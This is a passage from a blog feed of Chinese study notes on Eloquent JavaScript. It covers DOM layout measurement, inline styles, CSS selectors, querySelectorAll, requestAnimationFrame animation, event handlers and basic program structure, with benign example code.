<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"border: 3px solid red"</span>&gt;</span></span><br><span class="line">  I'm boxed in</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> para = <span class="built_in">document</span>.body.getElementsByTagName(<span class="string">"p"</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(<span class="string">"clientHeight:"</span>, para.clientHeight);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(<span class="string">"offsetHeight:"</span>, para.offsetHeight);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>找到在屏幕上的元素最准确位置的最高效的方式是<code>getBoundingClientRect</code>方法。它返回一个具有<code>top</code>,<code>bottom</code>,<code>left</code>和<code>right</code>属性的对象，表明元素边缘相对于屏幕左上角的像素位置。如果想要他们相对于整个文档，你必须要添加当前的滚动位置，你可以在<code>pageXOffset</code>和<code>pageYOffset</code>绑定中找到。</p>
<p>为一个文档布局是一项繁重的工作。考虑到速度，每当你改变文档的时候，浏览器引擎会尽可能长地等待，而不会立刻重新布局。当一个改变文档的JS程序运行结束的时候，浏览器就必须计算一个新的布局来将改变的文档绘画到屏幕上。当程序通过读取类似<code>offsetHeight</code>或者调用<code>getBoundClientRect</code>这样的属性来获取某个东西的位置或者大小时，提供正确的信息也需要计算一个布局。</p>
<p>一个反复读取DOM布局信息和改变DOM的程序会强制执行大量的布局计算，并且将因此运行的非常慢。下面的代码是一个这样的例子。它包含两个不同的程序，它构建一行2000像素宽的X字符并且测量每次花费的时间。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"one"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"two"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">time</span><span class="params">(name, action)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> start = <span class="built_in">Date</span>.now(); <span class="comment">// Current time in milliseconds</span></span></span><br><span class="line">    action();</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(name, <span class="string">"took"</span>, <span class="built_in">Date</span>.now() - start, <span class="string">"ms"</span>);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">  time(<span class="string">"naive"</span>, () =&gt; &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> target = <span class="built_in">document</span>.getElementById(<span class="string">"one"</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">while</span> (target.offsetWidth &lt; <span class="number">2000</span>) &#123;</span></span><br><span class="line"><span class="javascript">      target.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"X"</span>));</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="actionscript">  <span class="comment">// → naive took 32 ms</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">  time(<span class="string">"clever"</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> target = <span class="built_in">document</span>.getElementById(<span class="string">"two"</span>);</span></span><br><span class="line"><span class="javascript">    target.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"XXXXX"</span>));</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> total = <span class="built_in">Math</span>.ceil(<span class="number">2000</span> / (target.offsetWidth / <span class="number">5</span>));</span></span><br><span class="line"><span class="actionscript">    target.firstChild.nodeValue = <span class="string">"X"</span>.repeat(total);</span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="actionscript">  <span class="comment">// → clever took 1 ms</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><p>我们已经看见了不同的HTML元素可以以不同的方式绘画。一些作为块级元素显示，而另一些作为行内元素。一些添加样式，如strong使得成为粗体，a标签使得颜色变蓝并且添加下划线。</p>
<p>img标签展示图片的方式或者a标签在单击时做链接跳转和元素类型有关。但是我们可以改变关联到一个元素的样式，如文字颜色或者下划线。这是一个使用<code>style</code>属性的例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span>Normal link<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"."</span> <span class="attr">style</span>=<span class="string">"color: green"</span>&gt;</span>Green link<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个style属性可以包含一个或者多个声明，声明激素hi属性加上一个冒号和一个值。当有超过一个声明时，他们必须以分号分离。<code>color: red; border: none</code>。</p>
<p>文档的许多方面都可以被样式影响。例如，<code>display</code>属性控制元素以块级元素还是行内元素显示。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">This text is displayed <span class="tag">&lt;<span class="name">strong</span>&gt;</span>inline<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>,</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span> <span class="attr">style</span>=<span class="string">"display: block"</span>&gt;</span>as a block<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>, and</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span>not at all<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>.</span><br></pre></td></tr></table></figure>

<p><code>block</code>标识使得它们自己独在一行因为块级元素不和它们周围的文本显示在一起。最后一句话没有显示，因为<code>display:none</code>使得元素不在屏幕上显示。这是一种隐藏元素的新方式。相比于完全从文档中移除它们隐藏起来更好因为使得随后重新显示它们更加容易。</p>
<p>JS代码可以通过元素的<code>style</code>属性直接修改元素的样式。这个属性保存了一个包含所有可能的样式属性的对象。这些属性值是字符串，为了改变元素的某个样式我们可以写这些属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"para"</span> <span class="attr">style</span>=<span class="string">"color: purple"</span>&gt;</span></span><br><span class="line">  Nice text</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> para = <span class="built_in">document</span>.getElementById(<span class="string">"para"</span>);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(para.style.color);</span></span><br><span class="line"><span class="actionscript">  para.style.color = <span class="string">"magenta"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一些样式属性名字包含短横线，如<code>font-family</code>。因为这样的属性名在JS中看上去比较笨拙，style对象中的这样的属性名就移除了短横线，并且在他们后面的单词首字母大写（<code>style.fontFamily</code>）。</p>
<h2 id="层叠样式"><a href="#层叠样式" class="headerlink" title="层叠样式"></a>层叠样式</h2><p>HTML的样式系统叫做CSS，也就是层叠样式表。一个样式表就是在文档中给元素添加样式的一套规则。可以在<code>&lt;style&gt;</code>标签中给出。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  strong &#123;</span><br><span class="line">    font-style: italic;</span><br><span class="line">    color: gray;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Now <span class="tag">&lt;<span class="name">strong</span>&gt;</span>strong text<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> is italic and gray.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>名字中的层叠指出多个这样的规则被组合去产生元素最终的样式。例子中，默认的<code>&lt;strong&gt;</code>标签的样式，也就是<code>font-weight: bold</code>，被在<code>&lt;style&gt;</code>标签中的样式重写了，添加了<code>font-style</code>和<code>color</code>。</p>
<p>当多个规则应用到同一属性时，最近的读取规则获得一个高优先级并得到应用。所以如果<code>&lt;style&gt;</code>标签中包含<code>font-weight: normal</code>与默认的<code>font-weight</code>规则矛盾，文本就将会是normal，而不是bold的。直接应用到节点的<code>style</code>属性中的样式有最高的优先级并且总是胜出。</p>
<p>可以不用标签名在CSS规则中定位。<code>.abc</code>应用到所有类属性中包含”abc”的元素。<code>#xyx</code>应用到所有id属性包含”xyz”的元素（应该是文档中独一无二的）。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.subtle</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: gray;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">80%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#header</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: blue;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* p elements with id main and with classes a and b */</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#main</span><span class="selector-class">.a</span><span class="selector-class">.b</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>优先规则只有在规则有相同的特殊性时才具有就近原则。一个规则的特殊性就是能够多精准的描述匹配元素。例如，定位<code>p.a</code>要比定位<code>p</code>或者<code>.a</code>要精准，并且会有更高的优先级。</p>
<p><code>p &gt; a{...}</code>标记应用给定样式到所有是p标签直接孩子的a标签元素。相似地，<code>p a{..}</code>应用到p标签内的a标签，不管他们是不是直接孩子，抑或是间接孩子。</p>
<h2 id="查询选择器"><a href="#查询选择器" class="headerlink" title="查询选择器"></a>查询选择器</h2><p>我们不会在这本书中使用太多样式表。在浏览器中编程理解他们是有帮助的，但是它们很复杂，要单独写一本书。</p>
<p>我介绍选择器语法的主要原因——用在样式表中决定一组样式应用到哪些元素上——是我们可以使用这种微语言作为一种高效的方式去查找DOM元素。</p>
<p><code>querySelectorAll</code>方法，同时定义在<code>document</code>对象和元素节点，接受一个选择器字符串并返回一个包含所有匹配元素的<code>NodeList</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>And if you go chasing</span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"animal"</span>&gt;</span>rabbits<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>And you know you're going to fall<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Tell 'em a <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"character"</span>&gt;</span>hookah smoking</span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"animal"</span>&gt;</span>caterpillar<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Has given you the call<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">(selector)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">document</span>.querySelectorAll(selector).length;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(count(<span class="string">"p"</span>));           <span class="comment">// All &lt;p&gt; elements</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// → 4</span></span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(count(<span class="string">".animal"</span>));     <span class="comment">// Class animal</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// → 2</span></span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(count(<span class="string">"p .animal"</span>));   <span class="comment">// Animal inside of &lt;p&gt;</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// → 2</span></span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(count(<span class="string">"p &gt; .animal"</span>)); <span class="comment">// Direct child of &lt;p&gt;</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// → 1</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>不像如<code>getElementsByTagName</code>这样的方法，由<code>querySelectorAll</code>返回的对象不是实时的。当你改变文档的时候他不会改变。他也不是一个真正的数组，也可以使用<code>Array.from</code>将其转换为一个数组。</p>
<p><code>querySelector</code>方法（没有all部分）以一种相似的方式工作。将只返回第一个匹配的元素，或者没有匹配元素时返回null。</p>
<h2 id="定位和动画"><a href="#定位和动画" class="headerlink" title="定位和动画"></a>定位和动画</h2><p><code>position</code>样式属性以一种强大的方式影响布局。默认属性值为<code>static</code>，意味着元素坐落在文档中的正常位置。当被设置为<code>relative</code>时，元素仍然在文档中占据空间，但是现在<code>top</code>和<code>left</code>样式属性可被用于相对于正常的位置移动他。当<code>position</code>被设置为<code>absolute</code>时，元素被从正常的文档流中移除——那就是说，他不在占据空间并且可能被其他元素覆盖。同时，它的<code>top</code>和<code>left</code>属性可用于相对最近的<code>position</code>属性不是<code>static</code>的外部元素的左上角来绝对定位，或者如果没有这样的元素时，相对文档来定位。</p>
<p>我们可以利用这个来创造动画。下面的文档显示了一个猫的图片，以椭圆轨迹来回移动。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;p style=<span class="string">"text-align: center"</span>&gt;</span><br><span class="line">  &lt;img src=<span class="string">"img/cat.png"</span> style=<span class="string">"position: relative"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  let cat = document.querySelector("img");</span></span><br><span class="line"><span class="regexp">  let angle = Math.PI /</span> <span class="number">2</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">animate</span>(<span class="params">time, lastTime</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lastTime != <span class="literal">null</span>) &#123;</span><br><span class="line">      angle += (time - lastTime) * <span class="number">0.001</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cat.style.top = (<span class="built_in">Math</span>.sin(angle) * <span class="number">20</span>) + <span class="string">"px"</span>;</span><br><span class="line">    cat.style.left = (<span class="built_in">Math</span>.cos(angle) * <span class="number">200</span>) + <span class="string">"px"</span>;</span><br><span class="line">    requestAnimationFrame(<span class="function"><span class="params">newTime</span> =&gt;</span> animate(newTime, time));</span><br><span class="line">  &#125;</span><br><span class="line">  requestAnimationFrame(animate);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们的图片在页面居中并且<code>position</code>为<code>relative</code>。我们将重复改变图片的<code>top</code>和<code>left</code>样式来移动它。</p>
<p>该script使用<code>requestAnimationFrame</code>，每当浏览器准备重绘屏幕的时候调度<code>animate</code>函数去运行。<code>animate</code>函数本身再次调用<code>requestAnimationFrame</code>来调度下次升级。当浏览器窗口（或标签页）激活的时候，这将导致变化以每秒60帧做升级，这将产生一个好看的动画。</p>
<p>如果我们只是在循环中改变DOM，页面将会冻结，并且什么也不会展示在屏幕上。当JS程序运行的时候浏览器不会改变它们的显示，它们也不允许和页面产生任何交互。这就是为什么我们需要<code>requestAnimationFrame</code>——它让浏览器知道我们现在做完了，他可以继续做浏览器做的事情，如升级画面，响应用户行为。</p>
<p>当前时间作为一个参数传进动画函数。为了确保猫每毫秒的稳定运动，它基于当前时间和上次函数运行的时间差确定角度变化的速度。如果仅仅是每一步移动一个固定的角度，如果在同一台计算机上运行的另一个繁重任务是阻止函数运行几分之一秒，那么这个函数就会断断续续。</p>
<p>以圆移动通过三角函数<code>Math.cos</code>和<code>Math.sin</code>实现的。对于那些不熟悉他们的人，我将简要介绍他们，因为我们偶尔会在这本书中用到。</p>
<p><code>Math.cos</code>和<code>Math.sin</code>对于找到半径为1的圆心在0，0的圆上的点是有用的。这两个函数将他们的参数作为在圆上的位置来解释，0表示在圆的最右边，顺时针走一圈就是2pi。<code>Math.cos</code>告诉你对应给定位置的点的x坐标，<code>Math.sin</code>对应y坐标。大于2pi或者小于0的位置（或角度）是合法的。a+2pi和a指的是同样的角度。</p>
<p>这种量度角度的单位叫做弧度——满圆就是2pi弧度，相似于角度制的360°。常数pi可通过<code>Math.PI</code>在JS中读取。</p>
<p>猫的动画代码维护了一个计数器，<code>angle</code>来记录当前动画的角度，并在每次调用<code>animate</code>函数的时候增加。可以随后使用这个角度来计算当前图片元素的位置。<code>top</code>样式通过<code>Math.sin</code>就算并且乘以20，是我们椭圆的垂直半径。<code>left</code>样式基于<code>Math.cos</code>并且乘以了200，让这个椭圆看上去宽一点。</p>
<p>注意样式通常需要单位。在这个例子中，我们在数字后面添加”px”告诉浏览器我们以像素计数（对应厘米，”ems”或者其他单位）。这很容易忘记。使用不带单位的数字将会使得你的样式被忽略——除非数字是0。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>JS程序可以通过一个叫做DOM的数据结构和浏览器显示的文档交互。这个数据结构代表了浏览器对这个文档建立的模型，并且JS可以通过修改它来改变显示的文档。</p>
<p>DOM组织得像个树，妻子红的元素根据文档结构有层次低被安排。表示元素的对象由如<code>parentNode</code>和<code>childNodes</code>这样的属性，可被用于在在树中导航。</p>
<p>文档显示的方式可被通过样式来影响，可以通过直接关联样式到节点上，也可以为匹配的节点定义规则。有许多样式属性，如color和display。JS代码可以直接通过它的style属性来修改元素的样式。</p>
]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ15</title>
    <url>/2019/01/15/EJ15/</url>
    <content><![CDATA[<h1 id="处理事件"><a href="#处理事件" class="headerlink" title="处理事件"></a>处理事件</h1><p>一些程序和直接的用户输入打交道，如鼠标和键盘行为。那种类型的输入不能作为一个组织良好的数据结构获得——它实时的一块接一块的到来，并且程序被期望随时响应。</p>
<h2 id="事件处理器"><a href="#事件处理器" class="headerlink" title="事件处理器"></a>事件处理器</h2><p>想象一个接口，其中唯一的检测是否键盘上某一按键被按下的方式就是读取那个键的当前状态。为了能够响应按键，你必须持续读取那个键的状态，如此一来你就能在它释放之前捕捉到它。执行其他时间密集型的计算是危险的因为你可能错过按键。</p>
<p>一些基本的机器确实像这样处理输入。从这一步开始，硬件或者操作系统注意到按键操作并将其放到一个队列。程序就可以为新事件周期性检查队列并对发现的事情作出反应。</p>
<p>当然，它必须记住查看队列，并且经常这样做，因为在按键被按下和程序注意到事件之间的任何时间，都将导致软件感觉没有响应。这种方法叫做轮询。大多数的开发人员倾向于避免它。</p>
<p>一个更好的机制就是当事件发生的时候，系统主动通知我们的代码。浏览器通过允许我们将函数注册为特定事件的处理器来实现这个。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Click this document to activate the handler.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.addEventListener(<span class="string">"click"</span>, () =&gt; &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"You knocked?"</span>);</span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>window绑定指的是浏览器提供的内建对象。它代表了包含文档的浏览器窗口。调用它的<code>addEventListener</code>方法使得第一个参数事件发生的时候，第二个参数被调用。</p>
<h2 id="事件和DOM节点"><a href="#事件和DOM节点" class="headerlink" title="事件和DOM节点"></a>事件和DOM节点</h2><p>每个浏览器事件处理器都在上下文中注册。在前面的例子中，我们在<code>window</code>对象上调用<code>addEventListener</code>来为整个窗口注册一个处理器。这样的方法也能在DOM元素和其它类型的对象上发现。事件监听器只在事件发生在所注册对象的上下文中发生时才会调用。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>No handler here.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> button = <span class="built_in">document</span>.querySelector(<span class="string">"button"</span>);</span></span><br><span class="line"><span class="actionscript">  button.addEventListener(<span class="string">"click"</span>, () =&gt; &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"Button clicked."</span>);</span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ2</title>
    <url>/2018/12/19/EJ2/</url>
    <content><![CDATA[<h1 id="程序结构"><a href="#程序结构" class="headerlink" title="程序结构"></a>程序结构</h1><h2 id="表达式和语句"><a href="#表达式和语句" class="headerlink" title="表达式和语句"></a>表达式和语句</h2><p>一个产生值的代码片段叫做表达式，字面量也可以看作是一种表达式，表达式还可以嵌套表达式构成新的表达式。如果将表达式比喻为句子片段，那么语句就是能表达完整意思的一句话。语句的组合构成了一个程序，程序的意义在于改变“世界”，要么可以在屏幕上打印点什么东西，要么改变某种状态，以影响后面的程序，否则，程序将是无意义的。</p>
<a id="more"></a>

<p>虽然JS的语句末尾分号有时可以省略，但建议暂时不要省略末尾分号，否则可能有奇怪的事情发生。</p>
<h2 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h2><p>为了保存每个值，JS提供了绑定的机制，用关键字<code>let</code>声明绑定，<code>let one = 1;</code>也就是变量用于保存某种状态。变量的值不是一成不变，在程序的任何地方都可能会被改变，将绑定也就是变量想象为章鱼的触手，而不是盒子。如果请求一个未初始化的变量，将会得到underfined。</p>
<p>单个<code>let</code>语句也可以声明多个绑定，用逗号隔开即可。如<code>let one = 1, two = 2;</code>。</p>
<p>关键字<code>var</code>和<code>const</code>也用于变量声明。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"Ayda"</span>;</span><br><span class="line"><span class="keyword">const</span> greeting = <span class="string">"Hello "</span>;</span><br><span class="line"><span class="built_in">console</span>.log(greeting + name);</span><br><span class="line"><span class="comment">// -&gt; Hello Ayda</span></span><br></pre></td></tr></table></figure>
<p>关键字<code>var</code>用于pre-2015 JavaScript。下一章再讲述它和let的区别，这本书中主要用let，var有一些令人疑惑的特征。</p>
<p><code>const</code>关键字用于常量声明，只要变量不被销毁就保持相同的值不变。</p>
<h2 id="绑定名（变量名）"><a href="#绑定名（变量名）" class="headerlink" title="绑定名（变量名）"></a>绑定名（变量名）</h2><p>变量名可以是任何单词，包括数字，但不可以用数字开头。可以包括<code>$</code>和<code>_</code>，字母，数字但不能包含其他标点符号或特殊字符。</p>
<p>关键字和保留字不可以被用于变量名，不需要特殊记忆，出现错误时再查询即可。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>在某个特定时间，变量和它们的值的集合叫做environment（环境）。程序开始时，环境并不为空，因为包含一些语言标准的API，还提供了一些和周围系统做交互的方式。比如浏览器端，可以和当前加载的网站做交互或者读取鼠标键盘的输入。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>许多被提供在默认环境里面的值都是函数（function）类型。function就是一段代码被包装在一个值中。这样的值可被调用去运行包装的程序。</p>
<p>例如浏览器环境下的变量<code>prompt</code>绑定着一个函数，他显示一个对话框请求用户输入。</p>
<p>执行一个function被叫做invoking、calling或者applying it。可以通过在产生函数值得变量名后面加一个括号调用函数，括号中的内容就是参数（arguments），不同函数可能需要不同类型不同数量的参数。</p>
<p><code>prompt</code>函数并不是用的很多，但是可以用于实验目的或者玩具程序。</p>
<h2 id="console-log函数"><a href="#console-log函数" class="headerlink" title="console.log函数"></a>console.log函数</h2><p>对于JS的两种主要环境，浏览器端和Node端，都可以使用console.log向文本输出设备打印值。浏览器端使用F12调用开发者工具，在控制台就可以使用该函数。</p>
<p>前面说过变量名不可包含<code>.</code>号，但是这里为什么有呢？是因为这不是一个简单的变量，实际上是个表达式检索console的log属性。第四章会详细说明。</p>
<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>展示对话框或者打印什么东西属于副作用，需要函数有用在他们的副作用。函数也可以接受参数，产生值，在这种情况下，不需要副作用。比如，Math的max方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.max(<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">// -&gt; 3</span></span><br></pre></td></tr></table></figure>

<p>一个函数产生值，被叫做返回那个值。JS中，产生值的都是表达式，所以函数调用也可以被用于更大的表达式，如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.min(<span class="number">2</span>, <span class="number">4</span>) + <span class="number">100</span>);</span><br><span class="line"><span class="comment">// → 102</span></span><br></pre></td></tr></table></figure>

<h2 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h2><p>当程序多于一条语句，从上向下依次执行。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> theNumber = <span class="built_in">Number</span>(prompt(<span class="string">"Pick a number"</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Your number is the square root of "</span> +</span><br><span class="line">            theNumber * theNumber);</span><br></pre></td></tr></table></figure>

<p>Number函数转换一个值为数字，prompt产生字符串，所以需要做转换，紧接着的一行打印输入数字的平方数字。还有类似的函数如String和Boolean。这是最简单的直线控制流。</p>
<h2 id="条件性执行"><a href="#条件性执行" class="headerlink" title="条件性执行"></a>条件性执行</h2><p>有时，我们想让程序按照分支执行，比如我们只想让输入是数字的才计算它的平方数。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> theNumber = <span class="built_in">Number</span>(prompt(<span class="string">"Pick a number"</span>));</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Number</span>.isNaN(theNumber)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Your number is the square root of "</span> +</span><br><span class="line">              theNumber * theNumber);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这种情况下，如果输入了非数字类型的值，什么也不会被输出。</p>
<p>Number.isNaN是标准JS函数只有在参数为NaN的时候才返回true。</p>
<p>大括号包围起来的部分叫做一个block（块），如果if后面只有一条语句，可以省略大括号，如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span>) <span class="built_in">console</span>.log(<span class="string">"It's true"</span>);</span><br><span class="line"><span class="comment">// → It's true</span></span><br></pre></td></tr></table></figure>

<p>也可以用<code>else</code>表示替代分支。如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> theNumber = <span class="built_in">Number</span>(prompt(<span class="string">"Pick a number"</span>));</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Number</span>.isNaN(theNumber)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Your number is the square root of "</span> +</span><br><span class="line">              theNumber * theNumber);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Hey. Why didn't you give me a number?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

